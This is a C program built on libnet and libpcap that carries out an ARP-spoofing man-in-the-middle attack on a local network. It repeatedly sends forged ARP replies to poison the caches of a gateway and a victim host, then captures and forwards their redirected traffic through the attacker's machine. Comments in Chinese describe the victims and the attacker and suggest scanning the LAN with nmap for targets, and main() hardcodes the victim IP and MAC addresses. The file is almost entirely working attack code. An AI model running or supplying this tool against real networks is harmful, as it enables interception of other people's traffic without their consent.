#include<unistd.h>
#include<pcap.h>
#include<time.h>
#include<stdio.h>
#include<stdint.h>
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<unistd.h>
#include<libnet.h>
 
#define MAC_ADDR_LEN 6
#define IP_ADDR_LEN 4

struct ethernet_ip_hdr
{
    uint8_t  ether_dhost[6];/* destination ethernet address */
    uint8_t  ether_shost[6];/* source ethernet address */
    uint16_t ether_type;    /* protocol */
    uint8_t  ip_ver_hdrlen; 
    uint8_t  ip_tos;  
    uint16_t ip_total_len;         /* total length */
    uint16_t ip_id;          /* identification */
    uint16_t ip_frag;
    uint8_t  ip_ttl;          /* time to live */
    uint8_t  ip_proto;            /* protocol */
    uint16_t ip_hdrCRC;         /* checksum */
    uint8_t  ip_src[4];
    uint8_t  ip_dst[4];
};

struct MITM_para
{
    const uint8_t * ip_A;
    const uint8_t * mac_A;
    const uint8_t * ip_B;
    const uint8_t * mac_B;
    const uint8_t * mac_M;
    const char * BPF_filterStr;
    const char * devMitm;
};

int ForgeAndSendArp( const char * dev,const unsigned char * src_mac,const unsigned char * dst_mac,
                           const unsigned  char * src_ip,const unsigned char *dst_ip,uint16_t arpOp,unsigned int sendTimes
                         )
 {
         static char padPtr[18];
         libnet_t *net_t = NULL; 
         char err_buf[LIBNET_ERRBUF_SIZE];
         libnet_ptag_t p_tag; 
         unsigned int i=0;
 
         //printf("the src_ip_str is ,uint32 src_ip is %d\n",src_ip);
         //printf("the dst_ip_str is ,uint32 dst_ip is %d\n",dst_ip);
         
         net_t  = libnet_init(LIBNET_LINK_ADV, dev, err_buf);     
         if(net_t == NULL)
         {
                 printf("libnet_init error\n");
                 return 2;
         }
 
         p_tag = libnet_build_arp(
                         ARPHRD_ETHER,//hardware type ethernet
                         ETHERTYPE_IP,//protocol type
                         MAC_ADDR_LEN,//mac length
                         IP_ADDR_LEN,//protocol length
                         arpOp,//op type
                         (u_int8_t *)src_mac,//source mac addr
                         (u_int8_t *)src_ip,//source ip addr
                         (u_int8_t *)dst_mac,//dest mac addr
                         (u_int8_t *)dst_ip,//dest ip  addr
                         padPtr,//payload
                         18,//payload length
                         net_t,//libnet context
                         0//0 stands to build a new one
         );
         
         if(-1 == p_tag)
         {
                 printf("libnet_build_arp error:\n");
                 printf("ForgeAndSendArp: %s",net_t->err_buf);
                 libnet_destroy(net_t);
                 return 3;
         }
 
         p_tag = libnet_build_ethernet(//create ethernet header
                         (u_int8_t *)dst_mac,//dest mac addr
                         (u_int8_t *)src_mac,//source mac addr
                         ETHERTYPE_ARP,//protocol type
                        padPtr,//payload
                        0,//payload length
                         net_t,//libnet context
                         0//0 to build a new one
         );
 
         if(-1 == p_tag)
         {
                 printf("libnet_build_ethernet error!\n");
                 printf("ForgeAndSendArp: %s",net_t->err_buf);
                 libnet_destroy(net_t);
                 return 4;
         }
         
         int res;
         i=0;
         for(;i<sendTimes;i++)
           if(-1 == (res = libnet_write(net_t)))
           {
                 printf("A libnet_write error!\n");
                 printf("ForgeAndSendArp: %s",net_t->err_buf);
                 libnet_destroy(net_t);
                 return 5;
           }
         
         libnet_destroy(net_t);
         return 0;
 FAIL:        
         libnet_destroy(net_t);
                 return 6;
 }

void ArpSpoof(
          const uint8_t * ip_A, const uint8_t * mac_A,
      const uint8_t * ip_B, const uint8_t * mac_B,
      const uint8_t * mac_M,
          const char * devMitm
         )
{
  //
  /*
    arp-reply: M->A B is at M
    arp-reply: M->B A is at M
  */ 
  while(1)
  {  
  usleep(500000);
  ForgeAndSendArp( devMitm , mac_M , mac_A , ip_B , ip_A , 2, 1 );
      
  usleep(500000);
  ForgeAndSendArp( devMitm , mac_M , mac_B , ip_A , ip_B , 2, 1 );
  }
}

int BuildAndSendEthernetPacket(const char * dev,const unsigned int sendTimes,
                   const unsigned char * dst_mac,const unsigned char * src_mac,
                               const uint16_t protoType,const unsigned char * padPtr,const unsigned int padLength
                               )
{
         libnet_t *net_t = NULL; 
         char err_buf[LIBNET_ERRBUF_SIZE];
         libnet_ptag_t p_tag; 
         unsigned int i=0;
         
     //init the libnet context structure
         net_t  = libnet_init(LIBNET_LINK_ADV, dev, err_buf);     
         if(net_t == NULL)
         {
                 printf("libnet_init error\n");
                 return 1;
         }
      
      //build the ethernet packet
         p_tag = libnet_build_ethernet(//create ethernet header
                         dst_mac,//dest mac addr
                         src_mac,//source mac addr
                         protoType,//protocol type
                         padPtr,//payload
                         padLength,//payload length
                         net_t,//libnet context
                         0//0 to build a new one
         );
         if(-1 == p_tag)
         {
                 printf("libnet_build_ethernet error!\n");
                 printf("BuildAndSendEthernetPacket: %s",net_t->err_buf);
                 goto FAIL;
         }
         
         for(i=0;i<sendTimes;i++)
           if(-1 == libnet_write(net_t))
           {
                 printf("B libnet_write error!\n");
                 printf("BuildAndSendEthernetPacket: %s",net_t->err_buf);
                 goto FAIL;
           }
         
         libnet_destroy(net_t);
         return 0;
     FAIL:        
         libnet_destroy(net_t);
         return 1;
}

int BuildAndSendTCPPacket(const char * dev,const unsigned int sendTimes,
                   const unsigned char * dst_mac,const unsigned char * src_mac,
                               const uint16_t protoType,const unsigned char * padPtr,const unsigned int padLength
                               )
{
         libnet_t *net_t = NULL; 
         char err_buf[LIBNET_ERRBUF_SIZE];
         libnet_ptag_t p_tag; 
         unsigned int i=0;
         
     //init the libnet context structure
         net_t  = libnet_init(LIBNET_LINK_ADV, dev, err_buf);     
         if(net_t == NULL)
         {
                 printf("libnet_init error\n");
                 return 1;
         }
      
      //build the ethernet packet
         p_tag = libnet_build_ethernet(//create ethernet header
                         dst_mac,//dest mac addr
                         src_mac,//source mac addr
                         protoType,//protocol type
                         padPtr,//payload
                         padLength,//payload length
                         net_t,//libnet context
                         0//0 to build a new one
         );
         if(-1 == p_tag)
         {
                 printf("libnet_build_ethernet error!\n");
                 printf("BuildAndSendEthernetPacket: %s",net_t->err_buf);
                 goto FAIL;
         }
         
         for(i=0;i<sendTimes;i++)
           if(-1 == libnet_write(net_t))
           {
                 printf("B libnet_write error!\n");
                 printf("BuildAndSendEthernetPacket: %s",net_t->err_buf);
                 goto FAIL;
           }
         
         libnet_destroy(net_t);
         return 0;
     FAIL:        
         libnet_destroy(net_t);
         return 1;
}

void getPacketCallBack(u_char * arg, const struct pcap_pkthdr * pkthdr, const u_char * packet)
{
  int i;
  const struct MITM_para * mitmParaPtr=(const struct MITM_para * ) arg;
  unsigned int    sendTimes=1;
  const uint16_t  etherProto=0x0800;
  const char    * dev=mitmParaPtr->devMitm;
  const uint8_t * ether_Ahost=mitmParaPtr->mac_A;  
  const uint8_t * ether_Bhost=mitmParaPtr->mac_B;
  const uint8_t * ether_Mhost=mitmParaPtr->mac_M;    
  const uint8_t * A_IP=mitmParaPtr->ip_A;
  const uint8_t * B_IP=mitmParaPtr->ip_B;
  const struct    ethernet_ip_hdr * hdrPtr= (const struct ethernet_ip_hdr *  ) packet;  

  if (
       (0==memcmp(hdrPtr->ether_shost,ether_Ahost,6)) 
       //&& 
       //(0==memcmp(hdrPtr->ip_dst,B_IP,4))
     )
  { // packet: A send to B
     printf(" :) ether src A && ip dst B\n");
     BuildAndSendTCPPacket(dev,sendTimes,
                ether_Bhost,ether_Mhost,
                //dst_mac,  src_mac,
                                etherProto,packet+14,pkthdr->len-14
                               );
  } 
  else if (
       (0==memcmp(hdrPtr->ether_shost,ether_Bhost,6)) 
       //&& 
       //(0==memcmp(hdrPtr->ip_dst,A_IP,4))
     )
  { // packet: B send to A
     printf("ether src B && ip dst A\n");
     BuildAndSendEthernetPacket(dev,sendTimes,
                ether_Ahost,ether_Mhost,
                //dst_mac,  src_mac,
                etherProto,packet+14,pkthdr->len-14
                               );
  }  
}


int mitm_forwarder(
       const uint8_t * ip_A, const uint8_t * mac_A,
      const uint8_t * ip_B, const uint8_t * mac_B,
      const uint8_t * mac_M,const char * BPF_filterStr,
          const char * devMitm
        )
//BPF_filterStr: ether dst mac_M  and ip  
{
  char errBuf[PCAP_ERRBUF_SIZE], * devStr;
  struct bpf_program filter;

  struct MITM_para mitmPara;

  mitmPara.ip_A=ip_A;
  mitmPara.mac_A=mac_A;

  mitmPara.ip_B=ip_B;
  mitmPara.mac_B=mac_B;

  mitmPara.mac_M=mac_M;

  mitmPara.BPF_filterStr=BPF_filterStr;
  mitmPara.devMitm=devMitm;  

  /* get a device */
  devStr = pcap_lookupdev(errBuf);
  
  if(devStr)
  {
    printf("success: device: %s\n", devStr);
  }
  else
  {
    printf("error: %s\n", errBuf);
    exit(1);
  }
  
  /* open a device, wait until a packet arrives */
  pcap_t * device = pcap_open_live(devMitm, 65535, 1, 0, errBuf);
  
  if(!device)
  {
    printf("error: pcap_open_live(): %s\n", errBuf);
    exit(1);
  }
  // ether dst 00:11:22:33:44:55  and ip
  pcap_compile( device,&filter,BPF_filterStr,1,0 );  
  pcap_setfilter(device ,&filter );
  /* wait loop forever */
  pcap_loop(device, -1, getPacketCallBack,( u_char * ) &mitmPara);
  
  pcap_close(device);

  return 0;  
}


/*
        gw            kali
   192.168.1.1            192.168.1.108
14:E6:E4:94:B4:D6       00:7B:05:03:8E:90
        A                        B

             00:11:22:33:44:55
                    M
被攻击者：
  ip_A mac_A 
  ip_B mac_B
中间人：
 mac_B
中间人所选用的网络设备：
 devMitm : 如 "eth0"
中间人所用BPF过滤规则：
 BPF_filterStr : 格式是 "ether  dst 00:11:22:33:44:55 and ip "
 其中 00:11:22:33:44:55 是中间人eth0的mac，只需要按情况替换之即可
 建议使用形如 " nmap -sP 192.168.0.0/24 " 的命令扫描您所在的局域网，以搜集必要的信息。
 实验时，A可选用网关，B为局域网内一普通victim主机，M为您的主机，这样会更加清晰。

*/

void main()

{
    uint8_t ip_A[4]={192,168,1,1};
    uint8_t mac_A[6]={0x6c,0xb0,0xce,0xe3,0x19,0x14};
    
    uint8_t ip_B[4]={192,168,1,114};
    uint8_t mac_B[6]={0xbc,0x9f,0xef,0xd3,0x7b,0xe4};
    
    uint8_t mac_M[6]={0x00,0xc2,0xc6,0xb9,0x4d,0x80};
    
    //BPF_filterStr: ether dst mac_M  and ip
    char * BPF_filterStr=" ether dst 00:c2:c6:b9:4d:80 and ip ";
    char * devMitm="wlp1s0";

  //local
  pid_t sonPid;
  
  sonPid=fork();
  if( sonPid==-1 )
  {//failure
    printf("failure:mitm fork error :( \n");
  }
  else if(sonPid==0)
  {//child
    printf("child : pid:%d:)\n",getpid());
    ArpSpoof( ip_A,mac_A,ip_B,mac_B,mac_M,devMitm ); 
  }
  else
  {//parent
    printf("parent: pid:%d sonPid:%d :)\n",getpid(),sonPid);
    sleep(10);
    mitm_forwarder(
       ip_A,mac_A,
      ip_B,mac_B,
      mac_M,BPF_filterStr,
          devMitm
        );
  }
}